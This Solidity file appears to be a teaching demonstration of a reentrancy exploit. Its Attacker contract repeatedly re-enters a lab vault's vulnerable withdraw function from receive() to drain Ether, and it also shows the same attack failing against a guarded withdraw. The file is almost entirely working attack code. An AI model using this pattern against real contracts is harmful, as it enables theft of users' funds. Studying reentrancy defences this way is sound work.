// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/* NOTE: This contract is for educational purposes only. */

// Interface for the target FortKnoxVault contract
interface IFortKnoxVault {
    function deposit() external payable;
    function withdrawVulnerable(uint256 _amount) external;
    function withdrawSafe(uint256 _amount) external;
    function getBalance() external view returns (uint256);
    function getTotalVaultBalance() external view returns (uint256);
}

/**
 * @title Attacker
 * @author shivam
 * @notice A contract designed to exploit the reentrancy vulnerability in FortKnoxVault. FOR LEARNING PURPOSES ONLY.
 * @dev This contract deposits Ether into the vault and then uses its receive() function to recursively call the vault's vulnerable withdraw function.
 */
contract Attacker {
    // --- State Variables ---

    /// @notice The instance of the target FortKnoxVault contract.
    IFortKnoxVault public immutable vault;

    /// @notice Tracks how many times the receive function was called during an attack.
    uint256 public reentrancyCount;

    /// @notice Flag to indicate if the attack is currently targeting the safe withdrawal function.
    bool private attackingSafe;

    /// @notice Constant representing the gas cost to save for the attack.
    uint256 private constant GAS_COST = 100000;

    // --- Events ---

    /// @notice Emitted when the attack is initiated.
    /// @param initialDeposit The amount initially deposited into the vault.
    event AttackInitiated(uint256 initialDeposit);

    /// @notice Emitted each time the receive function is triggered during reentrancy.
    /// @param balanceBefore The vault's balance for this contract *before* the reentrant withdraw call.
    event ReentrantCall(uint256 balanceBefore);

    // --- Constructor ---

    /**
     * @notice Initializes the attacker contract by setting the target vault contract.
     * @param _vaultAddress The address of the FortKnoxVault contract to target.
     */
    constructor(address _vaultAddress) {
        vault = IFortKnoxVault(_vaultAddress);
    }

    // --- Attack Functions ---

    /**
     * @notice Initiates the reentrancy attack against the vault's vulnerable function.
     */
    function attackVulnerable() external payable {
        uint256 depositAmount = msg.value;
        require(depositAmount > 0, "Must deposit Ether to start attack");

        // Reset count for this attack attempt
        reentrancyCount = 0;
        // set the flag to false
        attackingSafe = false;

        // save some wei for gas
        uint256 depositToVault = depositAmount - GAS_COST;

        // deposit Ether into the vault
        vault.deposit{value: depositToVault}();
        emit AttackInitiated(depositToVault);

        // Start the withdrawal process, triggering the reentrancy
        vault.withdrawVulnerable(depositToVault);
    }

    /**
     * @notice Attempts to attack the safe withdrawal function (should fail due to nonReentrant).
     */
    function attackSafe() external payable {
        uint256 depositAmount = msg.value;
        require(depositAmount > 0, "Must deposit Ether to start attack");
        require(depositAmount > GAS_COST, "Deposit must be greater than gas cost");

        // Reset count for this attack attempt
        reentrancyCount = 0;
        // set the flag to true
        attackingSafe = true;

        // save some wei for gas
        uint256 depositToVault = depositAmount - GAS_COST;

        // 1. Deposit Ether into the vault
        vault.deposit{value: depositToVault}();
        emit AttackInitiated(depositToVault);

        // 2. Start the withdrawal process
        // This call is expected to succeed, but any reentrant calls from receive() should fail.
        vault.withdrawSafe(depositToVault);
    }

    // --- Fallback Function ---

    /**
     * @notice Fallback function called when the vault sends Ether back to this contract.
     * @dev This is the core of the reentrancy attack. It checks if the vault still has a balance for this contract and, if so, calls `withdrawVulnerable` again.
     */
    receive() external payable {
        reentrancyCount++;
        uint256 vaultBalance = vault.getBalance();
        emit ReentrantCall(vaultBalance);

        if (attackingSafe) {
            // this will fail due to the reentrancy guard
            vault.withdrawSafe(vaultBalance);
            return;
        }

        // Check if we can still withdraw (balance wasn't updated yet in withdrawVulnerable)
        if (vaultBalance > 0 && reentrancyCount < 10) {
            // Withdraw a small amount or the remaining balance to continue the loop
            uint256 amountToWithdraw = vaultBalance;
            // Only try to re-enter the vulnerable function
            // We could add a check here to see *which* function called us,
            // but for demonstration, we assume it was withdrawVulnerable.
            // Calling withdrawSafe here would (and should) fail due to the reentrancy guard.
            vault.withdrawVulnerable(amountToWithdraw);
        }
    }

    // --- Helper Functions ---

    /**
     * @notice Returns the Ether balance of this attacker contract itself.
     * @return balance The Ether balance (in wei).
     */
    function getAttackerBalance() external view returns (uint256 balance) {
        balance = address(this).balance;
    }

     /**
     * @notice Returns this attacker contract's balance *within* the target vault.
     * @return balance The Ether balance (in wei) according to the vault.
     */
    function getBalanceInVault() external view returns (uint256 balance) {
        balance = vault.getBalance();
    }

     /**
     * @notice Returns the total Ether balance held by the target vault contract.
     * @return totalBalance The total Ether balance (in wei).
     */
     function getTotalVaultBalance() external view returns (uint256 totalBalance) {
         totalBalance = vault.getTotalVaultBalance();
     }
}